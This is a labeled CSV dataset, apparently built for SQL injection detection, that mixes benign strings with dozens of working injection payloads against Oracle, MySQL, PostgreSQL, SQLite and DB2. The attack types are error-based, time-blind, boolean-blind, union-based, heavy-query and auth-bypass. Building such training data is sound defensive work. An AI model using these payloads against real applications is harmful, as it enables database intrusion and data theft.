payload_norm,payload_delex,sqli_type,db_engine,confidence,is_attack
palau-saverdera,__IDENT__ - __IDENT__,benign,generic,0.9,False
cousinea,__IDENT__,benign,generic,0.9,False
hymen_israeli@aulahost.vc,__IDENT__,benign,generic,0.9,False
"select * from users WHERE username = ""-6036 ) ) ) and ( ( ( 6723 = 6723"" and username = ""1\'+ ( select twyt where 3376 = 3376 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) +\'""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,out_of_band,oracle,0.9,True
"SELECT equal,southern,trouble FROM hurry LEFT JOIN Orders ON fell.floorID = headed.dust ORDER BY rope.heat","select __IDENT__ , __IDENT__ , __IDENT__ from __IDENT__ left join __IDENT__ on __IDENT__ = __IDENT__ order by __IDENT__",benign,generic,1.0,False
62128531b,__IDENT__,benign,generic,0.9,False
8.55461E+15,__IDENT__ + __INT__,benign,generic,0.9,False
SELECT * FROM paint WHERE spite NOT BETWEEN 'eye' AND 'giving',select * from __IDENT__ where __IDENT__ not between __STR__ and __STR__,benign,generic,1.0,False
"1"" ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --","__INT__ ) ) and __INT__ = like ( __STR__ , upper ( hex ( __IDENT__ ( __INT__ / __INT__ ) ) ) ) - -",time_blind,sqlite,0.7,True
"select * from users WHERE username = ""1\' or username = ""-9644 ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( 5616 = 5616"" or username = ""1"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) ) or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) and ( ( __INT__ = __INT__ __STR__ __INT__ __STR__,error_based,oracle,0.9,True
"1%"" ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #","__INT__ % "" ) ) ) or __INT__ = benchmark ( __INT__ , md5 ( __HEX__ ) ) #",time_blind,mysql,0.9,True
SELECT option_value FROM wp_options WHERE option_name = '_houzez_property_label_2767' LIMIT 1,select __IDENT__ from __IDENT__ where __IDENT__ = __STR__ limit __INT__,benign,mysql,0.9,False
"calle san millan, 148, 6?e","__IDENT__ __IDENT__ __IDENT__ , __INT__ , __IDENT__",benign,generic,0.9,False
"select * from users WHERE username = ""-9987 ) ) ) or username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""-5880\' ) ) and ( ( \'rwgl\' = \'rwgl""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ __STR__ ) ) and ( ( \ __STR__ = __IDENT__,auth_bypass,generic,0.5,True
"select * from users WHERE username = ""1"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""-2495 ) ) as hudw where 4197 = 4197","select * from __IDENT__ where __IDENT__ = __STR__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) or __IDENT__ = "" - __INT__ ) ) as __IDENT__ where __INT__ = __INT__",error_based,oracle,0.9,True
"select * from users WHERE username = ""-5863"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'xopg\' = \'xopg"" and username = ""1\' ) ) )",select * from __IDENT__ where __IDENT__ = __STR__ or __INT__ = cast ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) __IDENT__ | | ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) as __IDENT__ ) and ( ( ( \ __STR__ = \ __STR__ ) ) ),error_based,postgresql,0.85,True
-7054 ) as gzvf where 9146 = 9146 or 3038 = 3038,- __INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__,boolean_blind,generic,0.8,True
"select * from users WHERE username = ""1\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""1\' ) ) )",select * from __IDENT__ where __IDENT__ = __INT__ __STR__ ) ) ),error_based,oracle,0.95,True
SELECT AVG ( notice ) FROM sets,select avg ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False
"select * from users WHERE username = ""-5291\' ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and username = ""1\' and username = ""-1549\' )",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ),error_based,oracle,0.9,True
SELECT * FROM purpose 3,select * from __IDENT__ __INT__,benign,generic,1.0,False
d2s7sp79ro,__IDENT__,benign,generic,0.9,False
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 'nbzf' like 'nbzf,( select * from ( select ( sleep ( __INT__ ) ) ) __IDENT__ ) and ( ( __STR__ like __IDENT__,time_blind,generic,0.9,True
"alcalde esteban minguez, 169, 12?b","__IDENT__ __IDENT__ __IDENT__ , __INT__ , __IDENT__",benign,generic,0.9,False
SELECT * FROM plenty FETCH FIRST 50 PERCENT ROWS ONLY,select * from __IDENT__ fetch first __INT__ __IDENT__ rows only,benign,generic,1.0,False
1' ) as fxid where 5926 = 5926,__INT__ ) as __IDENT__ where __INT__ = __INT__,boolean_blind,generic,0.5,True
"SELECT dropped AS right, common AS [accident] FROM art","select __IDENT__ as right , __IDENT__ as __IDENT__ from __IDENT__",benign,generic,1.0,False
nemesio,__IDENT__,benign,generic,0.9,False
"select * from users WHERE username = ""-3978 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1%\' ) ) ) and ( ( ( \'%\' = \'""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,postgresql,0.85,True
alvino,__IDENT__,benign,generic,0.9,False
"1' and elt ( 1210 = 1210,sleep ( 5 ) ) and 'ioar' = 'ioar",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,time_blind,generic,0.85,True
jaworsky,__IDENT__,benign,generic,0.9,False
"SELECT * FROM gift ORDER BY cool ASC, waste DESC","select * from __IDENT__ order by __IDENT__ asc , __IDENT__ desc",benign,generic,1.0,False
"select * from users WHERE username = ""1\' ) ) as plbt where 4368 = 4368 and username = ""-7430\' ) as xfah where 1596 = 1596 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""1 ) ) ) and ( ( ( 4694 = 4694"" and username = ""-2756\' where 6156 = 6156","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ where __INT__ = __INT__",error_based,oracle,0.95,True
"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'njge\' like \'njge"" and username = ""1\' where 8537 = 8537 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.95,True
"select * from users WHERE username = ""-9770\' ) ) as ovhh where 7903 = 7903 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"" and username = ""1 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,boolean_blind,oracle,0.8,True
"select * from users WHERE username = ""1\' ) ) ) or username = ""1\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",select * from __IDENT__ where __IDENT__ = __INT__ __STR__ and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ),error_based,oracle,0.95,True
SELECT AVG ( sport ) FROM facing,select avg ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False
"select * from users WHERE username = ""-4289\' and username = ""-8099%\' ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( \'%\' = \'""",select * from __IDENT__ where __IDENT__ = __STR__,out_of_band,oracle,0.85,True
1' ) ) ) and sleep ( 5 ) and ( ( ( 'vbck' like 'vbck,__INT__ __STR__ __IDENT__ __STR__ __IDENT__,time_blind,mysql,0.9,True
SELECT steep ( s ) FROM laid SELECT point FROM tribe,select __IDENT__ ( __IDENT__ ) from __IDENT__ select __IDENT__ from __IDENT__,benign,generic,1.0,False
1'|| ( select 'yhpe' where 8010 = 8010 rlike ( select ( case when ( 7910 = 3752 ) then 1 else 0x28 end ) ) ) ||',__INT__ __STR__ __IDENT__ __STR__,time_blind,mysql,0.7,True
"1%' ) and elt ( 4670 = 9403,9403 ) and ( '%' = '",__INT__ % __STR__ % __STR__,boolean_blind,mysql,0.8,True
bardallur,__IDENT__,benign,generic,0.9,False
"select * from users WHERE username = ""1\' ) ) or username = ""-8007\' ) ) as bgpp where 9555 = 9555 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-7430\' ) as xfah where 1596 = 1596 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.9,True
jezabel,__IDENT__,benign,generic,0.9,False
"select * from users WHERE username = ""-8163 ) ) as cvai where 2360 = 2360 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""-9564 or-- 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.9,True
"select * from users WHERE username = ""1\' ) ) as bswc where 1635 = 1635 or username = ""-9501\' ) or username = ""-1254""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__,auth_bypass,generic,0.6,True
1 ) ) ) and sleep ( 5 ) and ( ( ( 6618 = 6618,__INT__ ) ) ) and sleep ( __INT__ ) and ( ( ( __INT__ = __INT__,time_blind,generic,0.9,True
SELECT AVG ( growth ) FROM apple SELECT SUM ( rule ),select avg ( __IDENT__ ) from __IDENT__ select sum ( __IDENT__ ),benign,generic,1.0,False
SELECT * FROM bus WHERE joined = 'breakfast' AND ( four = 'arm' OR upon = 'shore' ),select * from __IDENT__ where __IDENT__ = __STR__ and ( __IDENT__ = __STR__ or __IDENT__ = __STR__ ),benign,generic,1.0,False
acedera,__IDENT__,benign,generic,0.9,False
SELECT path ( s ) FROM handsome SELECT chapter ( s ),select __IDENT__ ( __IDENT__ ) from __IDENT__ select __IDENT__ ( __IDENT__ ),benign,generic,1.0,False
"select * from users WHERE username = ""1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""1\' ) ) as bswc where 1635 = 1635 or username = ""-9501\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ),error_based,oracle,0.95,True
SELECT volume ( s ) FROM field INNER JOIN,select __IDENT__ ( __IDENT__ ) from __IDENT__ inner join,benign,generic,1.0,False
SELECT * FROM seeing WHERE vegetable NOT LIKE '[world]%',select * from __IDENT__ where __IDENT__ not like __STR__,benign,mysql,0.9,False
"select * from users WHERE username = ""1\'+ ( select vohg where 6383 = 6383 or username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1\' ) where 1502 = 1502 and ( ( ( \'winx\' = \'winx""",select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__ __IDENT__ __STR__ __IDENT__,error_based,oracle,0.9,True
"select * from users WHERE username = ""-6523"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""1 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and ( ( 8254 = 8254""",select * from __IDENT__ where __IDENT__ = __STR__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - __STR__ __INT__ ) or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - __STR__,error_based,oracle,0.9,True
"1%' ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --","__INT__ % ' ) or __INT__ = ( select count ( * ) from __IDENT__ __IDENT__ , __IDENT__ __IDENT__ , __IDENT__ __IDENT__ , __IDENT__ __IDENT__ , __IDENT__ __IDENT__ ) - -",heavy_query,oracle,0.7,True
"1%' union all select null,null,null,null,null,null,null#","__INT__ % ' union all select null , null , null , null , null , null , null",union_based,generic,0.85,True
SELECT slight ( s ) FROM transportation INNER JOIN,select __IDENT__ ( __IDENT__ ) from __IDENT__ inner join,benign,mysql,0.9,False
"1'|| ( select 'xjtq' from dual where 5719 = 5719 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ) ||'",__INT__ __STR__ __IDENT__ __STR__,heavy_query,db2,0.7,True
SELECT * FROM realize WHERE successful NOT LIKE 'when%',select * from __IDENT__ where __IDENT__ not like __STR__,benign,generic,1.0,False
"select * from users WHERE username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""-6523"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ),boolean_blind,oracle,0.9,True
"select * from users WHERE username = ""1 and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1\' ) ) as plbt where 4368 = 4368 and username = ""-7430\' ) as xfah where 1596 = 1596 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ __STR__ ) ) as __IDENT__ where __INT__ = __INT__ and __IDENT__ = __STR__,error_based,oracle,0.95,True
darrieu@redstarz.sv,__IDENT__,benign,generic,0.9,False
a2o2e5,__IDENT__,benign,generic,0.9,False
SELECT * FROM willing WHERE fall = 'track' LIMIT 3,select * from __IDENT__ where __IDENT__ = __STR__ limit __INT__,benign,generic,1.0,False
"1%"" ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --","__INT__ % "" ) ) or char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) = __IDENT__ ( repeat ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) - -",time_blind,postgresql,0.7,True
